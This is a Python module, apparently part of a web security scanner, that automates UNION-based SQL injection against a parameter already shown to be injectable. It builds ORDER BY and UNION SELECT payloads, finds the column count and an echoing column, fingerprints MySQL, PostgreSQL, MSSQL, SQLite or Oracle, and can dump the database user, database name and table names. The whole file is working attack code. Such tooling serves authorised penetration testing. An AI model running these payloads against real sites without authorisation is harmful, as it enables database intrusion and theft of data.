"""SV1 - UNION based extraction.

The strongest SQLi proof is not an error message, it is reading the database
through the injection. Find the column count with ORDER BY, find the column
that echoes back, then ask the database who it is.
"""

from __future__ import annotations

import html
import re
import secrets

from . import config
from .dberrors import match_error
from .models import Finding

MAX_COLUMNS = 16
SHAPES = (
    ("'", "-- -"),
    ('"', "-- -"),
    (")", "-- -"),
    ("'", "#"),
)

VERSION_PROBES = (
    ("MySQL", "version()", re.compile(r"\b\d+\.\d+\.\d+[-\w.]*")),
    ("PostgreSQL", "version()", re.compile(r"PostgreSQL\s+[\d.]+")),
    ("MSSQL", "@@version", re.compile(r"Microsoft SQL Server[^<\"]{0,80}")),
    ("SQLite", "sqlite_version()", re.compile(r"\b\d+\.\d+\.\d+\b")),
    ("Oracle", "(SELECT banner FROM v$version WHERE ROWNUM=1)",
     re.compile(r"Oracle Database[^<\"]{0,60}")),
)

MARKER_NUMERIC = "13371337"

DUMP_EXPRESSIONS = {
    "MySQL": (
        ("user", "current_user()"),
        ("db", "database()"),
        ("tables", "(SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
                   "FROM information_schema.tables WHERE table_schema=database())"),
    ),
    "PostgreSQL": (
        ("user", "current_user"),
        ("db", "current_database()"),
        ("tables", "(SELECT string_agg(tablename, ',') FROM pg_tables "
                   "WHERE schemaname='public')"),
    ),
    "MSSQL": (
        ("user", "SUSER_NAME()"),
        ("db", "DB_NAME()"),
        ("tables", "(SELECT STRING_AGG(name, ',') FROM sys.tables)"),
    ),
    "SQLite": (
        ("tables", "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"),
    ),
}

VALUE_RE = re.compile(r"sv1\[(.*?)\]sv1", re.S)


def _dump_wrap(dialect: str, expression: str) -> str:
    """Bracket the value so it can be pulled out of the page without guessing."""
    if dialect == "PostgreSQL":
        return f"concat('sv1[', coalesce(({expression})::text, 'none'), ']sv1')"
    if dialect == "MSSQL":
        return ("CONCAT('sv1[', COALESCE(CONVERT(varchar(4000), "
                f"({expression})), 'none'), ']sv1')")
    if dialect == "SQLite":
        return f"'sv1[' || coalesce(({expression}), 'none') || ']sv1'"
    return f"CONCAT('sv1[', COALESCE(({expression}), 'none'), ']sv1')"


def _metadata(client, point, shape, columns: int, index: int, dialect: str) -> dict[str, str]:
    """Read identity and table names through the column that already echoes."""
    parts = DUMP_EXPRESSIONS.get(dialect, ())
    data: dict[str, str] = {}
    for label, expression in parts:
        exprs = ["NULL"] * columns
        exprs[index] = _dump_wrap(dialect, expression)
        response = client.send(point, _column_payload(shape, exprs))
        if not response.ok:
            continue
        dbms, _line = match_error(response.text)
        if dbms:
            continue
        match = VALUE_RE.search(response.text)
        if not match:
            continue
        value = " ".join(html.unescape(match.group(1)).split())
        if label == "tables":
            names = [name.strip() for name in value.split(",") if name.strip()]
            value = ",".join(names[: config.DUMP_TABLES_MAX])
        if not value:
            continue
        data[label] = value[: config.DUMP_MAX_VALUE]
    return data


def _column_payload(shape: tuple, exprs: list[str]) -> str:
    quote, suffix = shape
    return f"1{quote} UNION SELECT {','.join(exprs)}{suffix}"


def _order_payload(shape: tuple, columns: int) -> str:
    quote, suffix = shape
    return f"1{quote} ORDER BY {columns}{suffix}"


def _works(client, point, payload: str, base, baseline_error: bool) -> bool:
    response = client.send(point, payload)
    if not response.ok:
        return False
    dbms, _line = match_error(response.text)
    if dbms and not baseline_error:
        return False
    return base.matches(response.text)


def column_count(client, point, base, shape, baseline_error: bool) -> int:
    """ORDER BY fails one column past the end. Binary search that boundary."""
    if not _works(client, point, _order_payload(shape, 1), base, baseline_error):
        return 0
    low, high = 1, 2
    while high <= MAX_COLUMNS and _works(
        client, point, _order_payload(shape, high), base, baseline_error
    ):
        low, high = high, high * 2
    if high > MAX_COLUMNS:
        return 0
    while low + 1 < high:
        middle = (low + high) // 2
        if _works(client, point, _order_payload(shape, middle), base, baseline_error):
            low = middle
        else:
            high = middle
    return low


def marker_column(client, point, shape, columns: int, marker: str) -> tuple[int, str]:
    for index in range(columns):
        exprs = ["NULL"] * columns
        exprs[index] = f"'{marker}'"
        payload = _column_payload(shape, exprs)
        response = client.send(point, payload)
        if response.ok and marker in response.text:
            return index, payload
    for index in range(columns):
        exprs = ["NULL"] * columns
        exprs[index] = MARKER_NUMERIC
        payload = _column_payload(shape, exprs)
        response = client.send(point, payload)
        if response.ok and MARKER_NUMERIC in response.text:
            return index, payload
    return -1, ""


def extract(client, point, shape, columns: int, index: int, base_text: str):
    for dialect, expression, pattern in VERSION_PROBES:
        exprs = ["NULL"] * columns
        exprs[index] = expression
        payload = _column_payload(shape, exprs)
        response = client.send(point, payload)
        if not response.ok:
            continue
        dbms, _line = match_error(response.text)
        if dbms:
            continue
        match = pattern.search(response.text)
        if not match:
            continue
        value = " ".join(match.group(0).split())[:90]
        if value in base_text:
            continue
        return dialect, expression, value, payload
    return None


def probe(client, point, base, dump: bool = False) -> Finding | None:
    """Only called on points that already proved injectable."""
    baseline_error = bool(match_error(base.text)[0])
    for shape in SHAPES:
        columns = column_count(client, point, base, shape, baseline_error)
        if not columns:
            continue
        marker = "sv1u" + secrets.token_hex(4)
        index, _payload = marker_column(client, point, shape, columns, marker)
        if index < 0:
            continue
        extracted = extract(client, point, shape, columns, index, base.text)
        if extracted is None:
            continue
        dialect, expression, value, final_payload = extracted
        finding = Finding(
            kind="SQLI",
            severity="CRITICAL",
            url=point.url,
            method=point.method,
            param=point.param,
            payload=final_payload,
            confidence="CONFIRMED",
            evidence=f"{columns} columns, column {index + 1} echoes back; "
                     f"{expression} -> {value}",
            technique="union",
            detail=f"union based injection: {dialect} fingerprint extracted from the response",
        )
        if dump:
            finding.data = _metadata(client, point, shape, columns, index, dialect)
        return finding
    return None
